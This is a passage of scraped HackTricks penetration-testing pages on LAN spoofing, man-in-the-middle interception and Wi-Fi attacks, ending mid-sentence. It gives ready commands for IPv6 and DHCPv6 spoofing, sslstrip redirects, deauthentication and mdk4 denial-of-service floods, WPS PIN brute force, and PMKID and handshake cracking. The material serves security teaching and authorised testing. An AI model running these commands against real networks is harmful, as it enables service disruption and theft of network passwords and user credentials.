00:13:72:09:AD:76 [10.0.0.100]\n‚Äã\nSpoofing LLMNR, NBT-NS, and mDNS\n‚Äã\nMicrosoft systems use Link-Local Multicast Name Resolution (LLMNR) and the NetBIOS Name Service (NBT-NS) for local host resolution when DNS lookups fail. Apple Bonjour and Linux zero-configuration implementations use Multicast DNS (mDNS) to discover systems within a network. These protocols are unauthenticated and broadcast messages over UDP; thus, attackers can exploit them to direct users to malicious services.\nYou can impersonate services that are searched by hosts using Responder to send fake responses.\nRead here more information about\nhow to Impersonate services with Responder\n.\n‚Äã\nSpoofing WPAD\n‚Äã\nMany browsers use Web Proxy Auto-Discovery (WPAD) to load proxy settings from the network. A WPAD server provides client proxy settings via a particular URL (e.g.,\nhttp://wpad.example.org/wpad.dat\n) upon being identified through any of the following:\nDHCP, using a code 252 entry\n34\n‚Äã\nDNS, searching for the\nwpad\nhostname in the local domain\nMicrosoft LLMNR and NBT-NS (in the event of DNS lookup failure)\nResponder automates the WPAD attack‚Äîrunning a proxy and directing clients to a malicious WPAD server via DHCP, DNS, LLMNR, and NBT-NS.\nRead here more information about\nhow to Impersonate services with Responder\n.\n‚Äã\nSpoofing SSDP and UPnP devices\n‚Äã\nYou can offer different services in the network to try to\ntrick a user\nto enter some\nplain-text credentials\n.\nMore information about this attack in\nSpoofing SSDP and UPnP Devices\n.\nIPv6 Neighbor Spoofing\nThis attack is very similar to ARP Spoofing but in the IPv6 world. You can get the victim think that the IPv6 of the GW has the MAC of the attacker.\nsudo\nparasite6\n-l\neth0\n# This option will respond to every requests spoofing the address that was requested\nsudo\nfake_advertise6\n-r\n-w\n2\neth0\n<\nRouter_IPv\n6\n>\n#This option will send the Neighbor Advertisement packet every 2 seconds\nIPv6 Router Advertisement Spoofing/Flooding\nSome OS configure by default the gateway from the RA packets sent in the network. To declare the attacker as IPv6 router you can use:\nsysctl\n-w\nnet.ipv6.conf.all.forwarding\n=\n1\n4\nip\nroute\nadd\ndefault via\n<\nROUTER_IPv\n6\n>\ndev wlan0\nfake_router6 wlan0 fe80::01/16\nIPv6 DHCP spoofing\nBy default some OS try to configure the DNS reading a DHCPv6 packet in the network. Then, an attacker could send a DHCPv6 packet to configure himself as DNS. The DHCP also provides an IPv6 to the victim.\ndhcp6.spoof on\ndhcp6.spoof.domains\n<\nlist of domains\n>\n‚Äã\nmitm6\nHTTP (fake page and JS code injection)\nInternet Attacks\nsslStrip\nBasically what this attack does is, in case the\nuser\ntry to\naccess\na\nHTTP\npage that is\nredirecting\nto the\nHTTPS\nversion.\nsslStrip\nwill\nmaintain\na\nHTTP connection with\nthe\nclient and\na\nHTTPS connection with\nthe\nserver\nso it ill be able to\nsniff\nthe connection in\nplain text\n.\napt-get\ninstall\nsslstrip\nsslstrip\n-w\n/tmp/sslstrip.log\n--all\n- l\n10000\n-f\n-k\n#iptables --flush\n#iptables --flush -t nat\niptables\n-t\nnat\n-A\nPREROUTING\n-p\ntcp --destination-port\n80\n-j\nREDIRECT --to-port\n10000\niptables\n-A\nINPUT\n-p\ntcp --destination-port\n10000\n-j\nACCEPT\nMore info\nhere\n.\nsslStrip+ and dns2proxy for bypassing HSTS\nThe\ndifference\nbetween\nsslStrip+ and dns2proxy\nagainst\nsslStrip\nis that they will\nredirect\nfor example\nwww.facebook.com\nto\nwwww.facebook.com\n(note the\nextra\n\"\nw\n\") and will set the\naddress of this domain as the attacker IP\n. This way, the\nclient\nwill\nconnect\nto\nwwww.facebook.com\n(the attacker)\nbut behind the scenes\nsslstrip+\nwill\nmaintain\nthe\nreal connection\nvia https with\nwww.facebook.com\n.\nThe\ngoal\nof this technique is to\navoid HSTS\nbecause\nwwww\n.facebook.com\nwon't\nbe saved in the\ncache\nof the browser, so the browser will be tricked to perform\nfacebook authentication in HTTP\n.\nNote that in order to perform this attack the victim has to try to access initially to\nhttp://www.faceook.com\nand not https. This can be done modifying the links inside an http page.\nMore info\nhere\n,\nhere\nand\nhere\n.\nsslStrip or sslStrip+ doesn;t work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an \"important\" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag\nincludeSubdomains\nso the\nwwww.facebook.com\nexample from before won't work anymore as\nfacebook.com\nuses HSTS with\nincludeSubdomains\n.\nTODO: easy-creds, evilgrade, metasploit, factory\nTCP listen in port\nsudo nc -l -p 80\nsocat TCP4-LISTEN:80,fork,reuseaddr -\nTCP + SSL listen in port\nGenerate keys and self-signed certificate\nFILENAME=server\n# Generate a public/private key pair:\nopenssl genrsa -out $FILENAME.key 1024\n# Generate a self signed certificate:\nopenssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt\n# Generate the PEM file by just appending the key and certificate files:\ncat $FILENAME.key $FILENAME.crt >$FILENAME.pem\nListen using certificate\nsudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -\nListen using certificate and redirect to the hosts\nsudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0\nSome times, if the client checks that the CA is a valid one, you could\nserve a certificate of other hostname signed by a CA\n.\nAnother interesting test, is to serve a c\nertificate of the requested hostname but self-signed\n.\nOther things to test is to try to sign the certificate with a valid certificate that it is not a valid CA. Or to use the valid public key, force to use an algorithm as diffie hellman (one that do not need to decrypt anything with the real private key) and when the client request a probe of the real private key (like a hash) send a fake probe and expect that the client does not check this.\nBettercap\n# Events\nevents.stream off\n#Stop showing events\nevents.show\n#Show all events\nevents.show\n5\n#Show latests 5 events\nevents.clear\n‚Äã\n# Ticker (loop of commands)\nset\nticker.period\n5\n;\nset\nticker.commands\n\"wifi.deauth DE:AD:BE:EF:DE:AD\"\n;\nticker on\n‚Äã\n# Caplets\ncaplets.show\ncaplets.update\n‚Äã\n# Wifi\nwifi.recon on\nwifi.deauth BSSID\nwifi.show\n# Fake wifi\nset\nwifi.ap.ssid Banana\nset\nwifi.ap.bssid DE:AD:BE:EF:DE:AD\nset\nwifi.ap.channel\n5\nset\nwifi.ap.encryption\nfalse\n#If true, WPA2\nwifi.recon on\n;\nwifi.ap\nActive Discovery Notes\nTake into account that when a UDP packet is sent to a device that do not have the requested port an ICMP (Port Unreachable) is sent.\nARP discover\nARP packets are used to discover wich IPs are being used inside the network. The PC has to send a request for each possible IP address and only the ones that are being used will respond.\nmDNS (multicast DNS)\nBettercap send a MDNS request (each X ms) asking for\n_services_.dns-sd._udp.local\nthe machine that see this paket usually answer this request. Then, it only searchs for machine answering to \"services\".\nTools\nAvahi-browser (--all)\nBettercap (net.probe.mdns)\nResponder\nNBNS (NetBios Name Server)\nBettercap broadcast packets to the port 137/UDP asking for the name \"CKAAAAAAAAAAAAAAAAAAAAAAAAAAA\".\nSSDP (Simple Service Discovery Protocol)\nBettercap broadcast SSDP packets searching for all kind of services (UDP Port 1900).\nWSD (Web Service Discovery)\nBettercap broadcast WSD packets searching for services (UDP Port 3702).\nReferences\n‚Äã\nhttps://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9\n‚Äã\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nGithub Dorks & Leaks\nNext\nDHCPv6\nLast modified\n19d ago"
    },
    {
        "title": "Pentesting Wifi",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi",
        "text": "Pentesting Wifi\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nWifi basic commands\nip\nlink\nshow\n#List available interfaces\niwconfig\n#List available interfaces\nairmon-ng check\nkill\n#Kill annoying processes\nairmon-ng start wlan0\n#Monitor mode\nairmon-ng stop wlan0mon\n#Managed mode\nairodump-ng wlan0mon\n#Scan (default 2.4Ghz)\nairodump-ng wlan0mon\n--band\na\n#Scan 5Ghz\niwconfig wlan0 mode monitor\n#Put in mode monitor\niwconfig wlan0mon mode managed\n#Quit mode monitor - managed mode\niw dev wlan0 scan\n|\ngrep\n\"^BSS\\|SSID\\|WSP\\|Authentication\\|WPS\\|WPA\"\n#Scan available wifis\nTools\nEAPHammer\ngit clone https://github.com/s0lst1c3/eaphammer.git\n./kali-setup\nAirgeddon\nmv\n`\nwhich\ndhcpd\n`\n`\nwhich\ndhcpd\n`\n.old\napt\ninstall\nisc-dhcp-server\napt-get\ninstall\nsslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe\nRun airgeddon with docker\ndocker\nrun\n\\\n--rm\n\\\n-ti\n\\\n--name\nairgeddon\n\\\n--net\n=\nhost\n\\\n--privileged\n\\\n-p\n3000\n:3000\n\\\n-v\n/tmp:/io\n\\\n-e\nDISPLAY\n=\n$(\nenv\n|\ngrep\nDISPLAY\n|\nawk\n-F\n\"=\"\n'{print $2}'\n)\n\\\nv1s1t0r1sh3r3/airgeddon\nFrom:\nhttps://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux\n‚Äã\nwifiphisher\nIt can perform Evil Twin, KARMA, and Known Beacons attacks and then use a phishing template to manage to obtain the network real password or capture social network credentials.\ngit\nclone https://github.com/wifiphisher/wifiphisher.git\n# Download the latest revision\ncd\nwifiphisher\n# Switch to tool's directory\nsudo\npython setup.py\ninstall\n# Install any dependencies\n‚Äã\nWifite2\n‚Äã\nThis tool automates\nWPS/WEP/WPA-PSK\nattacks. It will automatically:\nSet the interface in monitor mode\nScan for possible networks - And let you select the victim(s)\nIf WEP - Launch WEP attacks\nIf WPA-PSK\nIf WPS: Pixie dust attack and the bruteforce attack (be careful the brute-force attack could take a long time). Notice that it doesn't try null PIN or database/generated PINs.\nTry to capture the PMKID from the AP to crack it\nTry to deauthenticate clients of the AP to capture a handshake\nIf PMKID or Handshake, try to bruteforce using top5000 passwords.\nAttacks Summary\nDoS\nDeauthentication/disassociation -- Disconnect everyone (or a specific ESSID/Client)\nRandom fake APs -- Hide nets, possible crash scanners\nOverload AP -- Try to kill the AP (usually not very useful)\nWIDS -- Play with the IDS\nTKIP, EAPOL -- Some specific attacks to DoS some APs\nCracking\nCrack\nWEP\n(several tools and methods)\nWPA-PSK\nWPS\npin \"Brute-Force\"\nWPA PMKID\nbruteforce\n[DoS +]\nWPA handshake\ncapture + Cracking\nWPA-MGT\nUsername capture\nBruteforce\nCredentials\nEvil Twin\n(with or without DoS)\nOpen\nEvil Twin [+ DoS] -- Useful to capture captive portal creds and/or perform LAN attacks\nWPA-PSK\nEvil Twin -- Useful to network attacks if you know the password\nWPA-MGT\n-- Useful to capture company credentials\nKARMA, MANA\n,\nLoud MANA\n,\nKnown beacon\n+ Open\n-- Useful to capture captive portal creds and/or perform LAN attacks\n+ WPA\n-- Useful to capture WPA handshakes\nDOS\nDeauthentication Packets\nThe most common way this sort of attack is done is with\ndeauthentication\npackets. These are a type of \"management\" frame responsible for disconnecting a device from an access point. Forging these packets is the key to\nhacking many Wi-Fi networks\n, as you can forcibly disconnect any client from the network at any time. The ease of which this can be done is somewhat frightening and is often done as part of gathering a WPA handshake for cracking.\nAside from momentarily using this disconnection to harvest a handshake to crack, you can also just let those deauths keep coming, which has the effect of peppering the client with deauth packets seemingly from the network they are connected to. Because these frames aren't encrypted, many programs take advantage of management frames by forging them and sending them to either one or all devices on a network.\nDescription from\nhere\n.\nDeauthentication using Aireplay-ng\naireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0\n-0 means deauthentication\n1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously\n-a 00:14:6C:7E:40:80 is the MAC address of the access point\n-c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then broadcast deauthentication is sent (not always work)\nath0 is the interface name\nDisassociation Packets\nDisassociation packets are another type of management frame that is used to disconnect a node (meaning any device like a laptop or cell phone) from a nearby access point. The difference between deauthentication and disassociation frames is primarily the way they are used.\nAn AP looking to disconnect a rogue device would send a deauthentication packet to inform the device it has been disconnected from the network, whereas a disassociation packet is used to disconnect any nodes when the AP is powering down, rebooting, or leaving the area.\nDescription from\nhere\n.\nThis attack can be performed by mdk4(mode \"d\"):\n# -c <channel>\n# -b victim_client_mac.txt contains the MAC address of the device to eliminate\n# -e WifiName is the name of the wifi\n# -B BSSID is the BSSID of the AP\n# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them\nmdk4 wlan0mon d\n-c\n5\n-b\nvictim_client_mac.txt\n-E\nWifiName\n-B\nEF:60:69:D7:69:2F\nMore DOS attacks by mdk4\nFrom\nhere\n.\nATTACK MODE b: Beacon Flooding\nSends beacon frames to show fake APs at clients. This can sometimes crash network scanners and even drivers!\n# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit\n# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)\n# -m use real BSSIDS\n# All the parameters are optional and you could load ESSIDs from a file\nmdk4 wlan0mon b\n-a\n-w\nnta\n-m\nATTACK MODE a: Authentication Denial-Of-Service\nSends authentication frames to all APs found in range. Too many clients can freeze or reset several APs.\n# -a BSSID send random data from random clients to try the DoS\n# -i BSSID capture and repeat pakets from authenticated clients\n# -m use real MACs\n# only -a or -i can be used\nmdk4 wlan0mon a\n[\n-i EF:60:69:D7:69:2F\n]\n[\n-a EF:60:69:D7:69:2F\n]\n-m\nATTACK MODE p: SSID Probing and Bruteforcing\nProbes APs and checks for answer, useful for checking if SSID has been correctly decloaked and if AP is in your sending range.\nBruteforcing of hidden SSIDs\nwith or without a wordlist is also available.\nATTACK MODE m: Michael Countermeasures Exploitation\nSends random packets or re-injects duplicates on another QoS queue to provoke Michael Countermeasures on\nTKIP APs\n. AP will then shutdown for a whole minute, making this an effective\nDoS\n.\n# -t <BSSID> of a TKIP AP\n# -j use inteligent replay to create the DoS\nmdk4 wlan0mon m\n-t\nEF:60:69:D7:69:2F\n[\n-j\n]\nATTACK MODE e: EAPOL Start and Logoff Packet Injection\nFloods an AP with\nEAPOL\nStart frames to keep it busy with\nfake sessions\nand thus disables it to handle any legitimate clients. Or logs off clients by\ninjecting fake\nEAPOL\nLogoff messages\n.\n# Use Logoff messages to kick clients\nmdk4 wlan0mon e\n-t\nEF:60:69:D7:69:2F\n[\n-l\n]\nATTACK MODE s: Attacks for IEEE 802.11s mesh networks\nVarious attacks on link management and routing in mesh networks. Flood neighbors and routes, create black holes and divert traffic!\nATTACK MODE w: WIDS Confusion\nConfuse/Abuse Intrusion Detection and Prevention Systems by cross-connecting clients to multiple WDS nodes or fake rogue APs.\n# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)\nmkd4\n-e\n<\nSSID\n>\n-c\n<\nchannel\n>\n[\n-z\n]\nATTACK MODE f: Packet Fuzzer\nA simple packet fuzzer with multiple packet sources and a nice set of modifiers. Be careful!\nAirggedon\nAirgeddon\noffers most of the attacks proposed in the previous comments:\nWPS\nWPS stands for Wi-Fi Protected Setup. It is a wireless network security standard that tries to make connections between a router and wireless devices faster and easier.\nWPS works only for wireless networks that use a password\nthat is encrypted with the\nWPA\nPersonal or\nWPA2\nPersonal security protocols. WPS doesn't work on wireless networks that are using the deprecated WEP security, which can be cracked easily by any hacker with a basic set of tools and skills. (From\nhere\n)\nWPS uses a 8 length PIN to allow a user to connect to the network, but it's first checked the first 4 numbers and, if correct, then is checked the second 4 numbers. Then, it is possible to Brute-Force the first half and then the second half (only 11000 possibilities).\nWPS Bruteforce\nThere are 2 main tools to perform this action: Reaver and Bully.\nReaver\nhas been designed to be a robust and practical attack against WPS, and has been tested against a wide variety of access points and WPS implementations.\nBully\nis a\nnew implementation\nof the WPS brute force attack, written in C. It has several advantages over the original reaver code: fewer dependencies, improved memory and cpu performance, correct handling of endianness, and a more robust set of options.\nThis attack takes advantage of a\nweakness in the eight-digit WPS PIN code\n; because of this issue, the protocol\ndiscloses information about the PIN‚Äôs first four digits\n, and the\nlast\ndigit works as a\nchecksum\n, which makes brute forcing the WPS AP easy.\nNote that some devices include\nbrute-force protections\n, which usually\nblock MAC addresses\nthat repeatedly try to attack. In that case, the complexity of this attack increases, because you‚Äôd have to\nrotate MAC\naddresses while testing PINs.\nIf the WPS valid code is found, both Bully and Reaver will use it to discover the WPA/WPA2 PSK used to protect the network, so you will be able to connect anytime you need it.\nreaver\n-i\nwlan1mon\n-b\n00:C0:CA:78:B1:37\n-c\n9\n-b\n-f\n-N\n[\n-L\n-d\n2\n]\n-vvroot\nbully wlan1mon\n-b\n00:C0:CA:78:B1:37\n-c\n9\n-S\n-F\n-B\n-v\n3\nSmart Brute force\nInstead of starting trying every possible PIN, you should check if there are available\nPINs discoveredfor the AP you are attacking\n(depending of the manufacturer MAC) and the\nPIN software generated PINs\n.\nThe database of known PINs is made for Access Points of certain manufacturers for which it is known that they use the same WPS PINs. This database contains the first three octets of MAC-addresses and a list of corresponding PINs that are very likely for this manufacturer.\nThere are several algorithms for generating WPS PINs. For example, ComputePIN and EasyBox use the MAC-address of the Access Point in their calculations. But the Arcadyan algorithm also requires a device ID.\nWPS Pixie Dust attack\nDominique Bongard discovered that some APs have weak ways of generating\nnonces\n(known as\nE-S1\nand\nE-S2\n) that are supposed to be secret. If we are able to figure out what these nonces are, we can easily find the WPS PIN of an AP since the AP must give it to us in a hash in order to prove that it also knowns the PIN, and the client is not connecting to a rouge AP. These E-S1 and E-S2 are essentially the \"keys to unlock the lock box\" containing the WPS pin. More info here:\nhttps://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)\n‚Äã\nBasically, some implementations failed in the use of random keys to encrypt the 2 parts of the the PIN(as it is discomposed in 2 parts during the authentication communication and sent to the client), so an offline attack could be used to brute force the valid PIN.\nreaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv\nbully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3\nNull Pin attack\nSome really bad implementations allowed the Null PIN to connect (very weird also). Reaver can test this (Bully cannot).\nreaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''\nAirgeddon\nAll the proposed WPS attacks can be easily performed using\nairgeddon.\n5 and 6 lets you try\nyour custom PIN\n(if you have any)\n7 and 8 perform the\nPixie Dust attack\n13 allows you to test the\nNULL PIN\n11 and 12 will\nrecollect the PINs related to the selected AP from available databases\nand\ngenerate\npossible\nPINs\nusing: ComputePIN, EasyBox and optionally Arcadyan (recommended, why not?)\n9 and 10 will test\nevery possible PIN\nWEP\nSo broken and disappeared that I am not going to talk about it. Just know that\nairgeddon\nhave a WEP option called \"All-in-One\" to attack this kind of protection. More tools offer similar options.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nWPA/WPA2 PSK\nPMKID\nIn 2018 hashcat authors\ndisclosed\na new type of attack which not only relies\non one single packet\n, but it doesn‚Äôt require any clients to be connected to our target AP but just communication between the attacker and the AP.\nIt turns out that\na lot\nof modern routers append an\noptional field\nat the end of the\nfirst EAPOL\nframe sent by the AP itself when someone is associating, the so called\nRobust Security Network\n, which includes something called\nPMKID\nAs explained in the original post, the\nPMKID\nis derived by using data which is known to us:\nPMKID = HMAC-SHA1-128(PMK, \"PMK Name\" | MAC_AP | MAC_STA)\nSince the ‚ÄúPMK Name‚Äù string is constant, we know both the BSSID of the AP and the station and the\nPMK\nis the same one obtained from a full 4-way handshake\n, this is all hashcat needs in order to crack the PSK and recover the passphrase!\nDescription obtained from\nhere\n.\nTo\ngather\nthis information and\nbruteforce\nlocally the password you can do:\nairmon-ng check\nkill\nairmon-ng start wlan0\ngit\nclone https://github.com/ZerBea/hcxdumptool.git\n;\ncd\nhcxdumptool\n;\nmake\n;\nmake\ninstall\nhcxdumptool\n-o\n/tmp/attack.pcap\n-i\nwlan0mon\n--enable_status\n=\n1\n#You can also obtains PMKIDs using eaphammer\n./eaphammer\n--pmkid\n--interface\nwlan0\n--channel\n11\n--bssid\n70\n:4C:A5:F8:9A:C1\nThe\nPMKIDs captured\nwill be shown in the\nconsole\nand also\nsaved\ninside _\n/tmp/attack.pcap\n_\nNow, convert the capture to\nhashcat/john\nformat and crack it:\nhcxtools/hcxpcaptool\n-z\nhashes.txt /tmp/attack.pcapng\nhashcat\n-m\n16800\n--force\nhashes.txt /usr/share/wordlists/rockyou.txt\njohn hashes.txt\n--wordlist\n=\n/usr/share/wordlists/rockyou.txt\nPlease note the the format of a correct hash contains\n4 parts\n, like:\n4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7*566f6461666f6e65436f6e6e6563743034383131343838\n__If yours\nonly\ncontains\n3 parts\n, then, it is\ninvalid\n(the PMKID capture wasn't valid).\nNote that\nhcxdumptool\nalso capture handshakes\n(something like this will appear:\nMP:M1M2 RC:63258 EAPOLTIME:17091\n). You could\ntransform\nthe\nhandshakes\nto\nhashcat\n/\njohn\nformat using\ncap2hccapx\ntcpdump\n-r\n/tmp/attack.pcapng\n-w\n/tmp/att.pcap\ncap2hccapx pmkid.pcapng pmkid.hccapx\n[\n\"Filter_ESSID\"\n]\nhccap2john pmkid.hccapx\n>\nhandshake.john\njohn handshake.john\n--wordlist\n=\n/usr/share/wordlists/rockyou.txt\naircrack-ng /tmp/att.pcap\n-w\n/usr/share/wordlists/rockyou.txt\n#Sometimes\nI have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool.\nHandshake capture\nOne way to attack\nWPA/WPA2\nnetworks is to capture a\nhandshake\nand try to\ncrack\nthe used password\noffline\n. To do so you need to find the\nBSSID\nand\nchannel\nof the\nvictim\nnetwork, and a\nclient\nthat is connected to the network.\nOnce you have that information you have to start\nlistening\nto all the commutation of that\nBSSID\nin that\nchannel\n, because hopefully the handshake will be send there:\nairodump-ng wlan0\n-c\n6\n--bssid\n64\n:20:9F:15:4F:D7\n-w\n/tmp/psk --output-format pcap\nNow you need to\ndeauthenticate\nthe\nclient\nfor a few seconds so it will automatically authenticate again to the AP (please read the part of DoS to find several ways to deauthenticate a client):\naireplay-ng\n-0\n0\n-a\n64\n:20:9F:15:4F:D7 wlan0\n#Send generic deauth packets, not always work\nNote that as the client was deauthenticated it could try to connect to a different AP or, in other cases, to a different network.\nOnce in the\nairodump-ng\nappears some handshake information this means that the handshake was captured and you can stop listening:\nOnce the handshake is captured you can\ncrack\nit with\naircrack-ng\n:\naircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap\nCheck if handshake in file\naircrack\naircrack-ng psk-01.cap\n#Search your bssid/essid and check if any handshake was capture\ntshark\ntshark\n-r\npsk-01.cap\n-n\n-Y\neapol\n#Filter handshake messages #You should have the 4 messages.\n‚Äã\ncowpatty\n‚Äã\ncowpatty -r psk-01.cap -s \"ESSID\" -f -\nIf this tool finds an uncompleted handshake of an ESSID before the completed one, it won't detect the valid one.\npyrit\napt-get\ninstall\npyrit\n#Not working for newer versions of kali\npyrit\n-r\npsk-01.cap analyze\nWPA Enterprise (MGT)\nIt\nis important to talk about the\ndifferent authentication methods\nthat could be used by an enterprise Wifi. For this kind of Wifis you will probably find in\nairodump-ng\nsomething like this:\n6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi\nEAP\n(Extensible Authentication Protocol) the\nskull\nof the\nauthentication communication\n, on\ntop\nof this, an\nauthentication algorithm\nis used by the server to authenticate the\nclient\n(\nsupplicant\n) and in same cases by the client to authenticate the server.\nMain authentication algorithms used in this case:\nEAP-GTC:\nIs an EAP method to support the use of hardware tokens and one-time passwords with EAP-PEAP. Its implementation is similar to MSCHAPv2, but does not use a peer challenge. Instead, passwords are sent to the access point in\nplaintext\n(very interesting for downgrade attacks).\nEAP-MD-5 (Message Digest)\n: The client send the MD5 hash of the password.\nNot recommended\n: Vulnrable to dictionary attacks, no server authentication and no way to generate per session wired equivalent privacy (WEP) keys.\nEAP-TLS (Transport Layer Security)\n: It relies on\nclient-side and server-side certificates\nto perform authentication and can be used to dynamically generate user-based and session-based WEP keys to secure subsequent communications.\nEAP-TTLS (Tunneled Transport Layer Security)\n:\nMutual authentication\nof the client and network through an encrypted channel (or tunnel), as well as a means to derive dynamic, per-user, per-session WEP keys. Unlike EAP-TLS,\nEAP-TTLS requires only server-side certificates (client will use credentials)\n.\nPEAP (Protected Extensible Authentication Protocol)\n: PEAP is like the\nEAP\nprotocol but creating a\nTLS tunnel\nto protect the communication. Then, weak authentication protocols can by used on top of EAP as they will be protected by the tunnel.\nPEAP-MSCHAPv2\n: This is also known as just\nPEAP\nbecause it is widely adopted. This is just the vulnerable challenge/response called MSCHAPv2 on to of PEAP (it is protected by the TLS tunnel).\nPEAP-EAP-TLS or just PEAP-TLS\n: Is very similar to\nEAP-TLS\nbut a TLS tunnel is created before the certificates are exchanged.\nYou can find more information about these authentication methods\nhere\nand\nhere\n.\nUsername Capture\nReading\nhttps://tools.ietf.org/html/rfc3748#page-27\nit looks like if you are using\nEAP\nthe\n\"Identity\"\nmessages\nmust be\nsupported\n, and the\nusername\nis going to be sent in\nclear\nin the\n\"Response Identity\"\nmessages.\nEven using one of the most secure of authentication methods:\nPEAP-EAP-TLS\n, it is possible to\ncapture the username sent in the EAP protocol\n. To do so,\ncapture a authentication communication\n(start\nairodump-ng\ninside a channel and\nwireshark\nin the same interface) and filter the packets by\neapol\n.\nInside the \"\nResponse, Identity\n\" packet, the\nusername\nof the client will appear.\nAnonymous Identities\n(Info taken from\nhttps://www.interlinknetworks.com/app_notes/eap-peap.htm\n)\nBoth\nEAP-PEAP and EAP-TTLS support identity hiding\n. In a WiFi environment, the access point (AP) typically generates an EAP-Identity request as part of the association process. To preserve anonymity, the EAP client on the user‚Äôs system may respond with only enough information to allow the first hop RADIUS server to process the request, as shown in the following examples.\nEAP-Identity = anonymous\nIn this example, all users will share the pseudo-user-name ‚Äúanonymous‚Äù. The first hop RADIUS server is an EAP-PEAP or EAP-TTLS server which drives the server end of the PEAP or TTLS protocol. The inner (protected) authentication type will then be either handled locally or proxied to a remote (home) RADIUS server.\nEAP-Identity = anonymous@realm_x\nIn this example, users belonging to different realms hide their own identity but indicate which realm they belong to so that the first hop RADIUS server may proxy the EAP-PEAP or EAP-TTLS requests to RADIUS servers in their home realms which will act as the PEAP or TTLS server. The first hop server acts purely as a RADIUS relay node.\nAlternatively, the first hop server may act as the EAP-PEAP or EAP-TTLS server and either process the protected authentication method or proxy it to another server. This option may be used to configure different policies for different realms.\nIn EAP-PEAP, once the PEAP server and the PEAP client establish the TLS tunnel, the PEAP server generates an EAP-Identity request and transmits it down the TLS tunnel. The client responds to this second EAP-Identity request by sending an EAP-Identity response containing the user‚Äôs true identity down the encrypted tunnel. This prevents anyone eavesdropping on the 802.11 traffic from discovering the user‚Äôs true identity.\nEAP-TTLS works slightly differently. With EAP-TTLS, the client typically authenticates via PAP or CHAP protected by the TLS tunnel. In this case, the client will include a User-Name attribute and either a Password or CHAP-Password attribute in the first TLS message sent after the tunnel is established.\nWith either protocol, the PEAP/TTLS server learns the user‚Äôs true identity once the TLS tunnel has been established. The true identity may be either in the 